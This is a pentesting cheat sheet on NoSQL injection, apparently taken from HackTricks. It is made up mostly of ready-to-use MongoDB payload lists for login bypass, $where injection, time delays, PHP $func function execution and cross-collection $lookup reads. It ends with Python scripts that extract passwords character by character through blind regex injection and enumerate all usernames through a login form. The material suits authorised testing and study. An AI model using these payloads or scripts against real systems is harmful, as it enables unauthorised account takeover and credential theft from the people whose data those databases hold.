# NoSQL Injection

### What is it? <a href="#what-is-it" id="what-is-it"></a>

NoSQL injection is where an attacker can manipulate the queries made to a NoSQL database through user input.

**A simple example:**

* A vulnerable web application has the endpoint /search?user={username}
* When a request is made, the application queries a NoSQL database (e.g., MongoDB) like this: `db.users.find({username: {$eq: username}})`
* If an attacker inserts a payload into {username} such as {"$ne": ""}, it may modify the query to retrieve all users.
* The vulnerable application sends this query to the database, potentially leaking all usernames.

It's important to note that payloads may vary depending on the database, query, and application. NoSQL injection can lead to:

* Sensitive data exposure
* Data manipulation
* Denial of service

**Paylaods :**&#x20;

```sql
//
%00
'
"
'"\/$[].>
'; return '' == '
;sleep(100);
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
username[$ne]=1&password[$ne]=1
{$gt: ''}
[$ne]=1
';sleep(5000);
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"user": "nullsweep"}
{"user": ["nullsweep", "foo"]}
{"$or": [{"user": "foo"}, {"user": "realuser"}]
{"$ne": -1}
{"$in": []}
{"$and": [ {"id": 5}, {"id": 6} ]}
{"$where":  "return true"}
{"$or": [{},{"foo":"1"}]}
{"$where":  "sleep(100)"} 
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Administrator","Admin", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### Checklist: <a href="#checklist" id="checklist"></a>

* What is the technology stack you're attacking?
* What NoSQL DB is being used (MongoDB, CouchDB, etc.)?
* Verify injection points:
  * URL parameters
  * Form fields
  * HTTP headers (e.g., cookies, etc.)
  * Out-of-band (data retrieved from a third party)
* Test with different operators: $eq, $ne, $gt, $gte, $lt, $lte, etc.
* Can you trigger different responses?
* Test for login bypass: {"$ne": ""}
* Test for blind NoSQLi
* Test for errors
* Test for conditional responses
* Test for conditional errors
* Test for time delays
* Test for out-of-band interactions
* Is there a blocklist?
  * Can you bypass the blocklist?

### Exploit <a href="#exploit" id="exploit"></a>

In PHP you can send an Array changing the sent parameter from *parameter=foo* to *parameter\[arrName]=foo.*

The exploits are based in adding an **Operator**:

```sql
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```

#### Basic authentication bypass <a href="#basic-authentication-bypass" id="basic-authentication-bypass"></a>

**Using not equal ($ne) or greater ($gt)**

```sql
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

#### **SQL - Mongo** <a href="#sql-mongo" id="sql-mongo"></a>

```mongodb
query = { $where: `this.username == '${username}'` }
```

An attacker can exploit this by inputting strings like `admin' || 'a'=='a`, making the query return all documents by satisfying the condition with a tautology (`'a'=='a'`). This is analogous to SQL injection attacks where inputs like `' or 1=1-- -` are used to manipulate SQL queries. In MongoDB, similar injections can be done using inputs like `' || 1==1//`, `' || 1==1%00`, or `admin' || 'a'=='a`.

```sql
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00     or    admin' || 'a'=='a
```

#### Extract **length** information <a href="#extract-length-information" id="extract-length-information"></a>

```sql
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```

#### Extract **data** information <a href="#extract-data-information" id="extract-data-information"></a>

```sql
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

#### **SQL - Mongos** <a href="#sql-mongo-1" id="sql-mongo-1"></a>

```sql
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```

#### PHP Arbitrary Function Execution <a href="#php-arbitrary-function-execution" id="php-arbitrary-function-execution"></a>

Using the **$func** operator of the [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) library (used by default) it might be possible to execute and arbitrary function as in [this report](https://swarm.ptsecurity.com/rce-cockpit-cms/).

```sql
"user":{"$func": "var_dump"}
```

![](https://book.hacktricks.xyz/~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-L_2uGJGU7AVNRcqRvEi%252F-MZWsRyR1Hwc7Z-p2RK5%252F-MZX2kqXQh7cnnR3osUr%252Fimage.png%3Falt%3Dmedia%26token%3D33b80c04-c085-44c2-973c-29d9225f8cfc\&width=768\&dpr=4\&quality=100\&sign=c5d19ba8\&sv=1)

#### Get info from different collection <a href="#get-info-from-different-collection" id="get-info-from-different-collection"></a>

It's possible to use [**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) to get info from a different collection. In the following example, we are reading from a **different collection** called **`users`** and getting the **results of all the entries** with a password matching a wildcard.

**NOTE:** `$lookup` and other aggregation functions are only available if the `aggregate()` function was used to perform the search instead of the more common `find()` or `findOne()` functions.

```sql
[
  {
    "$lookup":{
      "from": "users",
      "as":"resultado","pipeline": [
        {
          "$match":{
            "password":{
              "$regex":"^.*"
            }
          }
        }
      ]
    }
  }
]
```

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks\&utm_medium=text\&utm_campaign=ppc\&utm_content=nosql-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools. Get Access Today:

### MongoDB Payloads <a href="#mongodb-payloads" id="mongodb-payloads"></a>

List [from here](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)

```sql
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### Blind NoSQL Script <a href="#blind-nosql-script" id="blind-nosql-script"></a>

```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
    print("[i] Looking for char number "+str(i+1))
    for char in alphabet:
        r = requests.get("http://chall.com?param=^"+flag+char)
        if ("<TRUE>" in r.text):
            flag += char
            print("[+] Flag: "+flag)
            break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = {'ids': payload}, verify = False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```

#### Brute-force login usernames and passwords from POST login <a href="#brute-force-login-usernames-and-passwords-from-post-login" id="brute-force-login-usernames-and-passwords-from-post-login"></a>

This is a simple script that you could modify but the previous tools can also do this task.

```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames(prefix):
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*"}
    for c in possible_chars:
        username = "^" + prefix + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print(username)
            for user in get_usernames(prefix + c):
                usernames.append(user)
    return usernames

for u in get_usernames(""):
    get_password(u)
```

### References <a href="#references" id="references"></a>

* <https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media>
* <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection>
* <https://nullsweep.com/a-nosql-injection-primer-with-mongo/>
* <https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb>
* <https://book.hacktricks.xyz/pentesting-web/nosql-injection>
